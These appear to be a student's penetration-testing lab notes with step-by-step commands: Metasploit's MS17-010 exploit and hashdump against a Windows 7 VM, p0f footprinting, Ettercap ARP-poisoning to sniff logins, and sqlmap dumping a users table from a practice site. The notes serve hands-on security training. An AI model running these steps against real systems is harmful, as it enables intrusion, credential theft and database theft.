# practical 1

### Perform Penetration Testing to identify, assess, and exploit vulnerabilities in systems, applications, and networks using tools like Nmap, Nessus, Metasploit or Burp Suite

> OPEN KALI <br>
> OPEN WINDOWS 7  [download_from_here](https://drive.google.com/file/d/10dABmneWDDuFgk7L0Jy6OUBUdTsrUcok/view?usp=sharing)

Set network adapter as ``nat network``
- setting>network>select nat network>click ok

1. Scan the devices on the network 
```bash 
sudo arp-scan -l -I eth0 
```
2. perform following command on each ip address to identify the target os as windows 7 
```bash
sudo nmap -o ip_address
```
3. nmap vulnerabilty scan to identify the vulnerability 
```bash
sudo nmap -sV --script=vuln -oN win_nmap_result  ip_address_of_windows
```
4. Got smb vulnerability  ms17-010 , search the exploit
```bash
search  ms17-010
```
5. start msfconsole
```bash
msfconsole
```
6. search ms17-010 in the msf6>
```bash
search ms17-010
```
7. use the payload
```bash
use 0
```
8. use show options commands 
```bash
show options
```
9. set Rhost as windows ip
```bash
set RHOST ip_wind7
```
10. set LHOST as kali ip
```bash
set LHOST ip_kali
```
11. use exploit 
```bash
exploit
```
12.metapreter will open 
```bash 
screenshare
```

extra commands for password cracking 

```bash
sysinfo
```

```bash
hashdump
```
copy the john:1000 last : text and paste it in crackstation 

---

# Practical 2

### Perform passive footprinting 
For footprinting use tool P0F 

steps:
1. run the tool & open any website on google chrome
```bash 
p0f
```
you can see all the packets transmission from one end to another with their ip addresses 

2. use command to see the available source for footprinting
```bash
p0f -L
```

3. select the eth0
```bash
p0f -L eth0 -o /home/kali/output.txt
```
-o flag is used to store the output 

4. open the output stored file
```bash
open output.txt 
```

here u can see all the activity stored which is  analyze by the tool

---
# Practical 3
### Perform mitm attack 

use ettercap tool
> open the window7 machine with password "alqfna22"

> search the tool in the searchbar in kali
open it

>click on tick option that is start attack


>click on 3 dots and select scan for hosts 

>you will get host list 

>add the last ip to target 1 

>add first ip as default gateway to target 2

>select MITM option 

>select ARP poisoning 

>select sniff remote connections 

Go to windows 7 and open test.php.vulnweb.com

login there using any username and password

again come back to kali in ettercap

> u can see the content uname and password

---
# PRACTICAL 5

### perform sqlinjection attack

steps 

1. open test.php.vulnweb.com , go to artist section and copy ling parameter 
eg .http://test.php.vulnweb.com/artists.php?artist=2

2. open kali terminal install sqlmap
```bash
sudo apt install sqlmap
```

3. find database of the website 
```bash
sqlmap -u "http://test.php.vulnweb.com/artists.php?artist=2" --dbs
```

4. find the tables from the database 
```bash
sqlmap -u "http://test.php.vulnweb.com/artists.php?artist=2" -D acucart --tables
```

5. Dump the details from the table users 
```bash
sqlmap -u "http://test.php.vulnweb.com/artists.php?artist=2" -D acucart -T users 
--dump
```

DONE !!!!!